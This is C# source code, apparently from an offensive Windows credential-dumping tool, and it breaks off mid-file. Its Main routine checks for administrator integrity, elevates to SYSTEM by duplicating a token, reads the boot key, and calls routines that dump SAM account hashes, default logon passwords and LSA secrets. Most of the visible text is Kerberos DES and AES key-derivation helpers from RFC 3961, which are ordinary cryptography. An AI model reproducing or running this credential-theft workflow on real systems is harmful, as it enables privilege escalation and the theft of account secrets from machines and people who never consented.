using System;
using System.Linq;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Security.Principal;
using System.IO;

namespace SSD
{
    public class Program
    {
        public static void Main()
        {
            bool alreadySystem = false;

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("You need to be in high integrity to extract LSA secrets!");
                return;
            }
            else
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                bool isSytem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;

                if (isSytem)
                {
                    alreadySystem = true;
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    //Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                    if (Helpers.GetSystem() == false)
                    {
                        Console.WriteLine(String.Format("Failed to elevate: {0}", currentName));
                        return;
                    }
                }
            }

            byte[] bootkey = LSADump.GetBootKey();

            Console.WriteLine(String.Format("[*] Target system bootKey: 0x{0}", Helpers.Hexlify(bootkey)));

            Helpers.GetSamAccounts(bootkey);
            Helpers.GetDefaultLogon();
            Helpers.GetLsaSecrets(bootkey);

            if (!alreadySystem)
            {
                Interop.RevertToSelf();
            }
        }
    }

    public enum EncryptionType : int
    {
        /// <summary>
        /// Represent AES256_CTS_HMAC_SHA1_96  encryption type
        /// </summary>
        AES256_CTS_HMAC_SHA1_96 = 18,

        /// <summary>
        /// Represent AES128_CTS_HMAC_SHA1_96  encryption type
        /// </summary>
        AES128_CTS_HMAC_SHA1_96 = 17,

        /// <summary>
        /// Represent DES_CBC_MD5  encryption type
        /// </summary>
        DES_CBC_MD5 = 3,
    }

    public static class KeyGenerator
    {
        /// <summary>
        /// Generate key according to password, salt and encryption type
        /// </summary>
        /// <param name="type">encryption type</param>
        /// <param name="password">password</param>
        /// <param name="salt">salt</param>
        /// <returns>the generated key in bytes</returns>
        public static byte[] MakeKey(EncryptionType type, string password, string salt)
        {
            switch (type)
            {
                case EncryptionType.AES128_CTS_HMAC_SHA1_96:
                    {
                        return AesKey.MakeStringToKey(password, salt,
                            AesKey.DEFAULT_ITERATION_COUNT, AesKeyType.Aes128BitsKey);
                    }

                case EncryptionType.AES256_CTS_HMAC_SHA1_96:
                    {
                        return AesKey.MakeStringToKey(password, salt,
                            AesKey.DEFAULT_ITERATION_COUNT, AesKeyType.Aes256BitsKey);
                    }

                case EncryptionType.DES_CBC_MD5:
                    {
                        return DesKey.MakeStringToKey(password, salt);
                    }

                default:
                    throw new ArgumentException("Unsupported encryption type.");
            }
        }
    }

    public static class DesKey
    {
        #region Constants
        /// <summary>
        /// Weak key table
        /// (defined in National Bureau of Standards, U.S. Department of Commerce,
        /// "Guidelines for implementing and using NBS Data Encryption Standard,"
        /// Federal Information Processing Standards Publication 74, Washington, DC, 1981)
        /// </summary>
        private static readonly ulong[] weakKeys = new ulong[] {
            0x0101010101010101, 0xFEFEFEFEFEFEFEFE, 0xE0E0E0E0F1F1F1F1, 0x1F1F1F1F0E0E0E0E,
            0x011F011F010E010E, 0x1F011F010E010E01, 0x01E001E001F101F1, 0xE001E001F101F101,
            0x01FE01FE01FE01FE, 0xFE01FE01FE01FE01, 0x1FE01FE00EF10EF1, 0xE01FE01FF10EF10E,
            0x1FFE1FFE0EFE0EFE, 0xFE1FFE1FFE0EFE0E, 0xE0FEE0FEF1FEF1FE, 0xFEE0FEE0FEF1FEF1
        };
        #endregion Constants


        #region Private Methods
        /// <summary>
        /// Remove the MSB (Most Significant Bit) in each octet
        /// (in big endian mode) and concatenates the result
        /// [RFC 3961, Section 6.2, removeMSBits()]
        /// </summary>
        /// <param name="inputData">input 8 bytes</param>
        /// <returns>output 7 bytes</returns>
        private static byte[] RemoveMSBits(byte[] inputData)
        {
            // check input
            if (null == inputData || ConstValue.DES_BLOCK_SIZE != inputData.Length)
            {
                throw new ArgumentException("The input data must contain exactly 8 bytes.");
            }

            // remove the most significant bit from each byte
            List<char> newBits = new List<char>();
            foreach (byte b in inputData)
            {
                List<char> temp = new List<char>(CryptoUtility.GetBits(b));
                temp.RemoveAt(0);
                newBits.AddRange(temp);
            }

            // parse the 56 bits to 7 bytes
            return CryptoUtility.ConvertBitsToBytes(newBits);
        }


        /// <summary>
        /// Treat a 56-bit block as a binary string and reverse it
        /// [RFC 3961, Section 6.2, reverse(56bitblock)]
        /// </summary>
        /// <param name="inputData">input data to be reversed</param>
        /// <returns>the reversed data</returns>
        private static byte[] Reverse(byte[] inputData)
        {
            // Check input
            if (null == inputData || 7 != inputData.Length)
            {
                throw new ArgumentException("The inputData should be a 56 bits value.");
            }

            // Get all bits
            List<char> allBits = new List<char>();
            foreach (byte b in inputData)
            {
                allBits.AddRange(CryptoUtility.GetBits(b));
            }

            // Reverse
            allBits.Reverse();

            // Convert bits to bytes
            return CryptoUtility.ConvertBitsToBytes(allBits);
        }


        /// <summary>
        /// Add DES Parity Bits
        /// (Copies a 56-bit block into a 64-bit block, 
        /// left shifts content in each octet, and add DES parity bit)
        /// [RFC 3961, Section 6.2, add_parity_bits(56bitblock)]
        /// </summary>
        /// <param name="inputData">the input 56-bit data</param>
        /// <returns>the parity-added 64-bit data</returns>
        private static byte[] AddParityBits(byte[] inputData)
        {
            // check input
            if (null == inputData || 7 != inputData.Length)
            {
                throw new ArgumentException("The inputData should be a 56 bits value.");
            }

            // get all bits
            List<char> allBits = new List<char>();
            foreach (byte b in inputData)
            {
                allBits.AddRange(CryptoUtility.GetBits(b));
            }

            // insert parity bits
            List<char> newBits = new List<char>();
            for (int i = 0; i < ConstValue.DES_BLOCK_SIZE; i++)
            {
                // get 7 bits
                List<char> temp = allBits.GetRange(7 * i, 7);

                // count the number of ones
                bool even = true;
                foreach (char bit in temp)
                {
                    if (bit == '1')
                    {
                        even = !even;
                    }
                }

                // if the number of 1 in an octet is even, the least significant bit will be 1
                temp.Add(even ? '1' : '0');
                newBits.AddRange(temp);
            }

            // convert to bytes
            return CryptoUtility.ConvertBitsToBytes(newBits);
        }


        /// <summary>
        /// Fix parity bits in input data
        /// </summary>
        /// <param name="inputData">input data</param>
        /// <returns>parity-fixed data</returns>
        private static byte[] FixParity(byte[] inputData)
        {
            List<char> newBits = new List<char>();
            for (int i = 0; i < inputData.Length; i++)
            {
                char[] bits = CryptoUtility.GetBits(inputData[i]);

                // check the first 7 bits
                bool even = true;
                for (int j = 0; j < bits.Length - 1; j++)
                {
                    if (bits[j] == '1')
                    {
                        even = !even;
                    }
                }

                // Reset the last bit
                bits[bits.Length - 1] = even ? '1' : '0';
                newBits.AddRange(bits);
            }
            return CryptoUtility.ConvertBitsToBytes(newBits);
        }


        /// <summary>
        /// The key is corrected when the parity is fixed and 
        /// assure the key is not "weak key" or "semi-weak key"
        /// [RFC 3961, Section 6.2, key_correction(key))
        /// </summary>
        /// <param name="key">input key data</param>
        /// <returns>the corrected key data</returns>
        private static byte[] KeyCorrection(byte[] key)
        {
            // fix parity
            byte[] newKey = FixParity(key);

            // convert to little endian
            Array.Reverse(newKey);
            ulong weakKeyTest = BitConverter.ToUInt64(newKey, 0);

            // Recovery the order
            Array.Reverse(newKey);

            // if it is weak key or semi-weak key, correct it
            List<ulong> weakKeyList = new List<ulong>(weakKeys);
            if (weakKeyList.Contains(weakKeyTest))
            {
                // XOR with 0x00000000000000F0
                newKey[7] ^= 0xF0;
            }
            return newKey;
        }


        /// <summary>
        /// Generate DES key from specified string and salt
        /// [RFC 3961, Section 6.2, mit_des_string_to_key(string, salt)]
        /// </summary>
        /// <param name="password">password in UTF-8</param>
        /// <param name="salt">salt in UTF-8</param>
        /// <returns>the generated DES key (8 bytes)</returns>
        private static byte[] MitDesStringToKey(string password, string salt)
        {
            // check input
            if (null == password)
            {
                throw new ArgumentNullException("password");
            }
            if (null == salt)
            {
                throw new ArgumentNullException("salt");
            }

            // initialize input buffer
            List<byte> inputBytes = new List<byte>();
            inputBytes.AddRange(Encoding.UTF8.GetBytes(password));
            inputBytes.AddRange(Encoding.UTF8.GetBytes(salt));

            //Add padding to 8 byte boundary
            int inputLength = inputBytes.Count + (ConstValue.DES_BLOCK_SIZE - inputBytes.Count %
                ConstValue.DES_BLOCK_SIZE) % ConstValue.DES_BLOCK_SIZE;

            byte[] input = new byte[inputLength];
            Array.Copy(inputBytes.ToArray(), 0, input, 0, inputBytes.Count);

            // initialize temporary buffers
            byte[] blockBuffer = new byte[ConstValue.DES_BLOCK_SIZE];
            byte[] sevenBytesBuffer = new byte[7];
            byte[] fanFoldBuffer = new byte[7];

            // fan-fold padded value
            bool odd = true;
            for (int i = 0; i < input.Length; i += ConstValue.BYTE_SIZE)
            {
                // get a new block
                Array.Copy(input, i, blockBuffer, 0, blockBuffer.Length);

                // remove most significant bits
                sevenBytesBuffer = RemoveMSBits(blockBuffer);

                // do reverse
                if (!odd)
                {
                    sevenBytesBuffer = Reverse(sevenBytesBuffer);
                }
                odd = !odd;

                // do fan-fold
                for (int j = 0; j < fanFoldBuffer.Length; j++)
                {
                    fanFoldBuffer[j] ^= sevenBytesBuffer[j];
                }
            }

            // convert to a 64-bit intermediate key
            byte[] intermediateKey = KeyCorrection(AddParityBits(fanFoldBuffer));

            // encryption
            // (DES key is generated from intermediate key, the IV also uses the intermediate key)
            ICryptoTransform encryptor =
                CryptoUtility.CreateDesCbcEncryptor(intermediateKey, intermediateKey, PaddingMode.Zeros);
            byte[] result = encryptor.TransformFinalBlock(input, 0, input.Length);
            if (result.Length < 2 * ConstValue.DES_BLOCK_SIZE)
            {
                throw new FormatException("DES CBC Encryption Error.");
            }

            // DES key is the key-corrected last block of the encryption value
            byte[] lastBlock = new byte[ConstValue.DES_BLOCK_SIZE];
            Array.Copy(result, result.Length - ConstValue.DES_BLOCK_SIZE, lastBlock, 0, lastBlock.Length);
            return KeyCorrection(lastBlock);
        }
        #endregion Private Methods


        #region Internal Methods
        /// <summary>
        /// Generate an encryption key from password and salt
        /// [RFC 3961, Section 6.2, des_string_to_key(string,salt,params)]
        /// </summary>
        /// <param name="password">password</param>
        /// <param name="salt">salt</param>
        /// <returns>the encrypted key in bytes</returns>
        internal static byte[] MakeStringToKey(string password, string salt)
        {
            return MitDesStringToKey(password, salt);
        }
        #endregion Internal Methods
    }

    public static class CryptoUtility
    {
        #region Common
        /// <summary>
        /// Convert a byte to its binary presentation in char array
        /// (for example, byte b = 3, which will be presented by 
        /// char array {'0', '0', '0', '0', '0', '0', '1', '1'})
        /// </summary>
        /// <param name="b">the byte</param>
        /// <returns>the byte's binary presentation</returns>
        internal static char[] GetBits(byte b)
        {
            // initialize result array to '0'
            char[] result = new char[ConstValue.BYTE_SIZE] { '0', '0', '0', '0', '0', '0', '0', '0' };

            // get the binary
            char[] binary = Convert.ToString(b, 2).ToCharArray();

            // copy binary to result array
            Array.Copy(binary, 0, result, result.Length - binary.Length, binary.Length);
            return result;
        }


        /// <summary>
        /// Convert a list of binary bits to bytes
        /// (for example, char array {'0', '0', '0', '0', '0', '0', '1', '1'}
        /// will be converted to byte b = 3)
        /// </summary>
        /// <param name="bits">bits represented by chars ('0' and '1')</param>
        /// <returns>the converted byte array</returns>
        internal static byte[] ConvertBitsToBytes(List<char> bits)
        {
            if (null == bits)
            {
                throw new ArgumentNullException("bits");
            }
            if (bits.Count % ConstValue.BYTE_SIZE != 0)
            {
                throw new ArgumentException("Bits length should be a multiply of 8");
            }

            byte[] result = new byte[bits.Count / ConstValue.BYTE_SIZE];
            for (int i = 0; i < result.Length; i++)
            {
                string s = new string(bits.GetRange(i * ConstValue.BYTE_SIZE, ConstValue.BYTE_SIZE).ToArray());
                result[i] = Convert.ToByte(s, 2);
            }
            return result;
        }

        #endregion Common


        #region DES Crypto Related
        /// <summary>
        /// Create a DES-CBC encryptor
        /// </summary>
        /// <param name="key">the key</param>
        /// <param name="initialVector">the initialization vector</param>
        /// <param name="padding">the padding mode</param>
        /// <returns>the DES-CBC encryptor</returns>
        [System.Diagnostics.CodeAnalysis.SuppressMessage("Microsoft.Security.Cryptography", "CA5351:DESCannotBeUsed")]
        internal static ICryptoTransform CreateDesCbcEncryptor(
            byte[] key,
            byte[] initialVector,
            PaddingMode padding)
        {
            // check inputs
            if (null == key)
            {
                throw new ArgumentNullException("key");
            }
            if (null == initialVector)
            {
                throw new ArgumentNullException("initialVector");
            }

            // Set crypto to DES-CBC mode
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            des.Mode = CipherMode.CBC;
            des.BlockSize = ConstValue.DES_CBC_BLOCK_SIZE;

            // Set padding mode
            des.Padding = padding;

            // Create encryptor from key and initilize vector
            return des.CreateEncryptor(key, initialVector);
        }

        #endregion DES Crypto Related

        #region AES Crypto Related
        /// <summary>
        /// Create AES-CTS encryptor/decryptor
        /// </summary>
        /// <param name="key">the key</param>
        /// <param name="initialVector">the initialization vector</param>
        /// <returns>the AES-CTS encryptor</returns>
        internal static CipherTextStealingMode CreateAesCtsCrypto(
            byte[] key,
            byte[] initialVector)
        {
            // check inputs
            if (null == key)
            {
                throw new ArgumentNullException("key");
            }
            if (null == initialVector)
            {
                throw new ArgumentNullException("initialVector");
            }

            // initialize AES
            AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
            aes.Key = key;
            aes.IV = initialVector;

            // create AES-CTS encryptor/decryptor
            return new CipherTextStealingMode(aes);
        }
        #endregion AES Crypto Related
    }

    public static class ConstValue
    {
        #region Encryption and Checksum

        /// <summary>
        /// (8 bits) The length of byte in bits
        /// </summary>
        public const int BYTE_SIZE = 8;

        /// <summary>
        /// (16 bytes = 128 bits) Size of AES encryption block
        /// </summary>
        public const int AES_BLOCK_SIZE = 16;

        /// <summary>
        /// (8 bytes = 64 bits) Size of DES encryption block
        /// </summary>
        public const int DES_BLOCK_SIZE = 8;

        /// <summary>
        /// (64 bits) Block Size in DES-CBC
        /// </summary>
        internal const int DES_CBC_BLOCK_SIZE = 64;

        #endregion
    }

    public class CipherTextStealingMode
    {
        #region Private Variables
        /// <summary>
        /// When each block-size plain text is encrypted, 
        /// the cipher should be temporarily stored as cipher state 
        /// for XOR operation with the next block-size plain text
        /// </summary>
        private byte[] cipherState;

        /// <summary>
        /// The Initialize Vector
        /// </summary>
        private byte[] iv;

        /// <summary>
        /// The encryption Block Size of the specific symmetric algorithm (in bytes)
        /// </summary>
        private int blockSize;

        /// <summary>
        /// The encryptor
        /// </summary>
        private ICryptoTransform encryptor;

        /// <summary>
        /// The decryptor
        /// </summary>
        private ICryptoTransform decryptor;
        #endregion Private Variables


        #region Constructor
        /// <summary>
        /// Initialize CipherTextStealingMode with a specific symmetric algorithm
        /// </summary>
        /// <param name="symmetricAlgorithm">The symmetric algorithm</param>
        public CipherTextStealingMode(SymmetricAlgorithm symmetricAlgorithm)
        {
            // in CTS Mode there is no padding
            symmetricAlgorithm.Padding = PaddingMode.None;

            // set the symmetric algorithm's mode to ECB
            // (for single block encryption and decryption)
            symmetricAlgorithm.Mode = CipherMode.ECB;

            // get the symmetric algorithm's block size in bytes
            blockSize = symmetricAlgorithm.BlockSize / 8;
            if (blockSize != symmetricAlgorithm.IV.Length)
            {
                throw new ArgumentException(
                    "The IV size should equal to the block size.");
            }

            // initialize local IV
            iv = symmetricAlgorithm.IV;

            // initialize cipher state using the symmetric algorithms's IV
            cipherState = new byte[blockSize];
            symmetricAlgorithm.IV.CopyTo(cipherState, 0);

            // create encryptor and decryptor
            encryptor = symmetricAlgorithm.CreateEncryptor();
            decryptor = symmetricAlgorithm.CreateDecryptor();
        }
        #endregion Constructor


        #region Private Methods: Encryption
        /// <summary>
        /// Encrypt in CBC Mode
        /// </summary>
        /// <param name="inputBuffer">input buffer</param>
        /// <param name="inputOffset">the offset of which the to be encrypted data begins</param>
        /// <param name="inputCount">the length of to be encrypted data</param>
        /// <returns>the encrypted data</returns>
        private byte[] EncryptWithCBCMode(
            byte[] inputBuffer,
            int inputOffset,
            int inputCount)
        {
            // encryption
            List<byte> result = new List<byte>();
            int endIndex = inputOffset + inputCount;
            while (inputOffset < endIndex)
            {
                // xor a block, encrypt it, and update cipher state
                byte[] blockBuffer = XorCipherState(inputBuffer, inputOffset, cipherState, blockSize);
                blockBuffer = encryptor.TransformFinalBlock(blockBuffer, 0, blockBuffer.Length);
                blockBuffer.CopyTo(cipherState, 0);
                inputOffset += blockSize;

                // save the block to result
                result.AddRange(blockBuffer);
            }
            return result.ToArray();
        }


        /// <summary>
        /// Encrypt in CTS Mode
        /// </summary>
        /// <param name="inputBuffer">input buffer</param>
        /// <param name="inputOffset">the offset of which the to be encrypted data begins</param>
        /// <param name="inputCount">the length of to be encrypted data</param>
        /// <returns>the encrypted data</returns>
        private byte[] EncryptWithCTSMode(
            byte[] inputBuffer,
            int inputOffset,
            int inputCount)
        {
            // caculate if the to-be-encrypted data is exactly a multiply of the block size
            int remainLength = inputCount % blockSize;
            if (0 == remainLength)
            {
                // first encrypt in CBC mode
                byte[] outputBuffer = EncryptWithCBCMode(inputBuffer, inputOffset, inputCount);

                // then swap the last two blocks
                int lastBlockIndex = outputBuffer.Length - blockSize;
                int nextToLastBlockIndex = outputBuffer.Length - 2 * blockSize;
                byte[] lastBlock = ArrayUtility.SubArray<byte>(outputBuffer, outputBuffer.Length - blockSize);
                Array.Copy(outputBuffer, nextToLastBlockIndex, outputBuffer, lastBlockIndex, blockSize);
                Array.Copy(lastBlock, 0, outputBuffer, nextToLastBlockIndex, blockSize);
                return outputBuffer;
            }
            else
            {
                // encrypt the input data without the last two blocks
                List<byte> result = new List<byte>();
                int frontLength = inputCount - blockSize - remainLength;
                if (frontLength > 0)
                {
                    byte[] frontOutputBuffer = EncryptWithCBCMode(inputBuffer, inputOffset, frontLength);
                    inputOffset += frontLength;
                    result.AddRange(frontOutputBuffer);
                }

                // encrypt the next to last block            
                byte[] nextToLastBlock = XorCipherState(inputBuffer, inputOffset, cipherState, blockSize);
                nextToLastBlock = encryptor.TransformFinalBlock(nextToLastBlock, 0, nextToLastBlock.Length);
                Array.Copy(nextToLastBlock, 0, cipherState, 0, blockSize);
                nextToLastBlock = ArrayUtility.SubArray<byte>(nextToLastBlock, 0, remainLength);

                // encrypt the last block
                inputOffset += blockSize;
                byte[] lastBlock = XorCipherState(inputBuffer, inputOffset, cipherState, remainLength);
                lastBlock = encryptor.TransformFinalBlock(lastBlock, 0, lastBlock.Length);

                // swap the last two blocks
                result.AddRange(lastBlock);
                result.AddRange(nextToLastBlock);
                return result.ToArray();
            }
        }
        #endregion Private Methods: Encryption


        #region Private Methods: Helpers
        /// <summary>
        /// XOR a block of data in the input buffer with current cipher state
        /// (The first xorSize bytes in cipher state are used for the operation)
        /// </summary>
        /// <param name="inputBuffer">input buffer</param>
        /// <param name="inputOffset">input offset</param>
        /// <param name="cipherStateBuffer">cipher state buffer</param>
        /// <param name="xorSize">the size in cipher state that used for XOR operation</param>
        /// <returns>the XOR result of one block size</returns>
        private byte[] XorCipherState(
            byte[] inputBuffer,
            int inputOffset,
            byte[] cipherStateBuffer,
            int xorSize)
        {
            byte[] blockBuffer = (byte[])cipherStateBuffer.Clone();
            for (int i = 0; i < xorSize; i++)
            {
                blockBuffer[i] = (byte)(inputBuffer[inputOffset + i] ^ cipherStateBuffer[i]);
            }
            return blockBuffer;
        }
        #endregion Private Methods: Helpers


        #region Internal Methods
        /// <summary>
        /// Computes the encryption transformation for the specified region of the specified byte array.
        /// </summary>
        /// <param name="inputBuffer">The input on which to perform the operation on.</param>
        /// <param name="inputOffset">The offset into the byte array from which to begin using data from.</param>
        /// <param name="inputCount">The number of bytes in the byte array to use as data.</param>
        /// <returns>The computed transformation</returns>
        /// <exception cref="System.ArgumentNullException">Thrown when input buffer is null</exception>
        /// <exception cref="System.ArgumentException">Thrown when invalid argument is detected</exception>
        public byte[] EncryptFinal(
            byte[] inputBuffer,
            int inputOffset,
            int inputCount)
        {
            // Check input
            if (null == inputBuffer)
            {
                throw new ArgumentNullException("inputBuffer");
            }
            if (inputBuffer.Length < blockSize)
            {
                throw new ArgumentException(
                    "The input data to be encrypted should be at least one block size.");
            }
            if (inputOffset + inputCount > inputBuffer.Length)
            {
                throw new ArgumentException(
                   "The to-be encrypted data should not exceed the input array length.");
            }

            // Do encryption according to the to be encrypted data length
            byte[] result;
            if (inputCount == blockSize)
            {
                // exactly one block
                result = EncryptWithCBCMode(inputBuffer, inputOffset, inputCount);
            }
            else
            {
                // larger than one block
                result = EncryptWithCTSMode(inputBuffer, inputOffset, inputCount);
            }

            // Reset cipher state
            iv.CopyTo(cipherState, 0);
            return result;
        }

        #endregion Internal Methods
    }

    public static class ArrayUtility
    {
        /// <summary>
        /// Gets a sub array from an array.
        /// </summary>
        /// <typeparam name="T">The type of array.</typeparam>
        /// <param name="array">The original array.</param>
        /// <param name="startIndex">The start index to copy.</param>
        /// <param name="length">The length of sub array.</param>
        /// <exception cref="ArgumentException">Raised when startIndex or startIndex plus the length of 
        /// sub array exceeds the range of original array.</exception>
        /// <returns>The sub array.</returns>
        public static T[] SubArray<T>(T[] array, int startIndex, int length)
        {
            T[] subArray = new T[length];
            Array.Copy(array, startIndex, subArray, 0, length);

            return subArray;
        }

        /// <summary>
        /// Gets a sub array from an array. With given start index, it will return the rest of the array.
        /// </summary>
        /// <typeparam name="T">The type of array.</typeparam>
        /// <param name="array">The original array.</param>
        /// <param name="startIndex">The start index to copy.</param>
        /// <exception cref="ArgumentException">Raised when startIndex or startIndex plus the length of 
        /// sub array exceeds the range of original array.</exception>
        /// <returns>The sub array.</returns>
        public static T[] SubArray<T>(T[] array, int startIndex)
        {
            return SubArray<T>(array, startIndex, array.Length - startIndex);
        }
    }

    /// <summary>
    /// An enum to indicate the AES key size in bits.
    /// </summary>
    public enum AesKeyType : int
    {
        /// <summary>
        /// AES key type not specified
        /// </summary>
        None = 0,

        /// <summary>
        /// 128 bits AES key
        /// </summary>
        Aes128BitsKey = 128,

        /// <summary>
        /// 192 bits AES key
        /// </summary>
        Aes192BitsKey = 192,

        /// <summary>
        /// 256 bits AES key
        /// </summary>
        Aes256BitsKey = 256
    }


    /// <summary>
    /// Derived Key Types (RFC3961)
    /// </summary>
    public enum DerivedKeyType : int
    {
        /// <summary>
        /// An added value used as the default value.
        /// </summary>
        None = 0,

        /// <summary>
        /// Used to derive key to generate mic in Checksum mechanism.
        /// </summary>
        Kc = 0x99,

        /// <summary>
        /// Used to derive key to encrypt data.
        /// </summary>
        Ke = 0xAA,

        /// <summary>
        /// Used to derive key to calculate checksum in Encryption mechanism.
        /// </summary>
        Ki = 0x55
    }


    /// <summary>
    /// AES Key Generator
    /// </summary>
    public static class AesKey
    {
        #region Constants
        /// <summary>
        /// Default Interation Count
        /// [RFC3962 Section 4, Page 2]
        /// </summary>
        internal const uint DEFAULT_ITERATION_COUNT = 4096;


        /// <summary>
        /// ASCII encoding for the string "Kerberos"
        /// </summary>
        private readonly static byte[] KERBEROS_CONSTANT = new byte[] { 0x6b, 0x65, 0x72, 0x62, 0x65, 0x72, 0x6f, 0x73 };
        #endregion Constants


        #region Private Methods
        /// <summary>
        /// DK is the key-derivation function described in RFC 3961
        /// [RFC 3961 section 5.1 A Key Derivation Function]
        /// </summary>
        /// <param name="baseKey">the base key</param>
        /// <param name="wellKnownConstant">the "well-known constant"</param>
        /// <param name="aesKeyType">AES key type which decides key size</param>
        /// <returns>the derived key in bytes</returns>
        public static byte[] DK(
            byte[] baseKey,
            byte[] wellKnownConstant,
            AesKeyType aesKeyType)
        {
            // caculate DR value
            byte[] drBytes = DR(baseKey, wellKnownConstant, aesKeyType);

            // caculate Random
            return RandomToKey(drBytes);
        }


        /// <summary>
        /// DR is the random-octet generation function described in RFC 3961
        /// [RFC 3961 section 5.1 A Key Derivation Function]
        /// </summary>
        /// <param name="baseKey">the base key which is to be derived from</param>
        /// <param name="wellKnownConstant">the "well-known constant"</param>
        /// <param name="aesKeyType">AES key type which decides key size</param>
        /// <returns>the pseudorandom octets</returns>
        private static byte[] DR(
            byte[] baseKey,
            byte[] wellKnownConstant,
            AesKeyType aesKeyType)
        {
            // to be encrypted data
            byte[] toBeEncrypted = new byte[wellKnownConstant.Length];
            wellKnownConstant.CopyTo(toBeEncrypted, 0);

            // n-fold the "well-known constant" if needed
            if (wellKnownConstant.Length != ConstValue.AES_BLOCK_SIZE)
            {
                toBeEncrypted = NFold(wellKnownConstant, ConstValue.AES_BLOCK_SIZE * ConstValue.BYTE_SIZE);
            }

            // AES key size
            uint aesKeySize = (uint)aesKeyType / ConstValue.BYTE_SIZE;

            // initialize key array
            byte[] rawkey = new byte[aesKeySize];

            // count means the total number of bytes has been copy to the rawkey.
            // length means how length of bytes should be copy to the rawkey array.
            uint count = 0;
            uint length = 0;

            // The initialCipherVector should be all zeros.
            byte[] initialCipherVector = new byte[ConstValue.AES_BLOCK_SIZE];

            // AES-CTS encryptor
            CipherTextStealingMode aesCtsCrypto = CryptoUtility.CreateAesCtsCrypto(baseKey, initialCipherVector);
            while (count < aesKeySize)
            {
                byte[] cipherBlock = aesCtsCrypto.EncryptFinal(toBeEncrypted, 0, toBeEncrypted.Length);
                length = (aesKeySize - count <= cipherBlock.Length ? (aesKeySize - count) : Convert.ToUInt32(cipherBlock.Length));
                Array.Copy(cipherBlock, 0, rawkey, count, length);
                count += length;
                toBeEncrypted = cipherBlock;
            }
            return rawkey;
        }


        /// <summary>
        /// RandomToKey generates a key from a random bitstring of a specific size.
        /// All the bits of the input string are assumed to be equally random, 
        /// even though the entropy present in the random source may be limited.
        /// [RFC 3961, Page 4]
        /// 
        /// For AES, random-to-key function simply returns as what is given
        /// [RFC 3961, Page 15]
        /// </summary>
        /// <param name="random">the random bitstring</param>
        /// <returns>the generated key</returns>
        public static byte[] RandomToKey(byte[] random)
        {
            return random;
        }


        /// <summary>
        /// Generate the "well-known constant"
        /// [RFC 3961, Page 15]
        /// the "well-known constant" used for the DK function is the key usage number, 
        /// expressed as four octets in big-endian order, followed by one octet indicated below:
        /// Kc = DK(base-key, usage | 0x99); 
        /// Ke = DK(base-key, usage | 0xAA);
        /// Ki = DK(base-key, usage | 0x55);
        /// </summary>
        /// <param name="usage">key usage number</param>
        /// <param name="derivedKeyType">the derived key type</param>
        /// <returns>the "well-known constant"</returns>
        private static byte[] GetWellKnownConstant(int usage, DerivedKeyType derivedKeyType)
        {
            // the "well-known constant" contains 5 bytes
            byte[] wellKnownConstant = new byte[5];

            // the first 4 bytes = usage number in big endian 
            byte[] usageBytes = BitConverter.GetBytes(usage);
            Array.Reverse(usageBytes);
            usageBytes.CopyTo(wellKnownConstant, 0);

            // the 5th byte = the derivedKeyType
            wellKnownConstant[4] = (byte)derivedKeyType;
            return wellKnownConstant;
        }


        /// <summary>
        /// N-Fold is an algorithm that takes m input bits and "stretches" them
        /// to form N output bits with equal contribution from each input bit to
        /// the output, as described in Blumenthal, U. and S. Bellovin, "A Better
        /// Key Schedule for DES-Like Ciphers", Proceedings of PRAGOCRYPT '96,1996.
        /// </summary>
        /// <param name="input">The to be n-folded input data</param>
        /// <param name="outputBits">The expected output length in bits</param>
        /// <returns>The n-folded data</returns>
        private static byte[] NFold(byte[] input, uint outputBits)
        {
            // check inputs
            if (null == input)
            {
                throw new ArgumentNullException("input");
            }
            if (0 != outputBits % ConstValue.BYTE_SIZE)
            {
                throw new ArgumentException(
                    "The desired output length in bits should be a multiply of 8 bits.");
            }

            // input and output length in bytes
            int inLength = input.Length;
            int outLength = (int)outputBits / ConstValue.BYTE_SIZE;

            // caculate their lowest common multiplier
            int lcm = CalculateLowestCommonMultiple(outLength, inLength);

            // "stretch" the data length to the LCM value
            byte[] stretchedData = new byte[lcm];
            int count = lcm / inLength;
            for (int i = 0; i < count; i++)
            {
                // expand
                Array.Copy(input, 0, stretchedData, i * inLength, inLength);

                // rotate 13 bits right
                input = Rotate13(input);
            }

            // divide the stretched data to (LCM/outLength) blocks 
            // then calculate their "one's complement addition"
            byte[] output = new byte[outLength];
            byte[] blockData = new byte[outLength];
            int blockCount = lcm / outLength;
            for (int i = 0; i < blockCount; i++)
            {
                // get a block
                Array.Copy(stretchedData, i * outLength, blockData, 0, blockData.Length);

                // addition
                output = OCADD(output, blockData);
            }
            return output;
        }


        /// <summary>
        /// The LCM function called by N-Fold Algorithm
        /// (calculate the Lowest Common Multiple of two integer)
        /// </summary>
        /// <param name="n">value n</param>
        /// <param name="k">value k</param>
        /// <returns>the caculated LCM value</returns>
        private static int CalculateLowestCommonMultiple(int n, int k)
        {
            int a = n;
            int b = k;
            int c;

            while (b != 0)
            {
                c = b;
                b = a % b;
                a = c;
            }
            return (n * k / a);
        }


        /// <summary>
        /// The ROT13 function called by N-Fold Algorithm
        /// (which rotates a string to 13 bits right)
        /// </summary>
        /// <param name="input">input string</param>
        private static byte[] Rotate13(byte[] input)
        {
            if (null == input)
            {
                throw new ArgumentNullException("input");
            }

            // get all the bits
            List<char> listBits = new List<char>();
            foreach (byte b in input)
            {
                listBits.AddRange(CryptoUtility.GetBits(b));
            }

            // rotate all the bits to 13-bit right
            List<char> listBitsRotated = new List<char>(listBits);
            for (int i = 0; i < listBits.Count; i++)
            {
                if (i + 13 < listBitsRotated.Count)
                {
                    listBitsRotated[i + 13] = listBits[i];
                }
                else
                {
                    int index = (i + 13) % listBitsRotated.Count;
                    listBitsRotated[index] = listBits[i];
                }
            }

            // covert the rotated data to bytes
            return CryptoUtility.ConvertBitsToBytes(listBitsRotated);
        }


        /// <summary>
        /// The OCADD function called by N-Fold Algorithm
        /// (calculate "one's complement addition" between two byte array)
        /// </summary>
        /// <param name="leftBuffer">one byte array in addition operation</param>
        /// <param name="rightBuffer">the other byte array in addition operation</param>
        /// <returns>The operation result</returns>
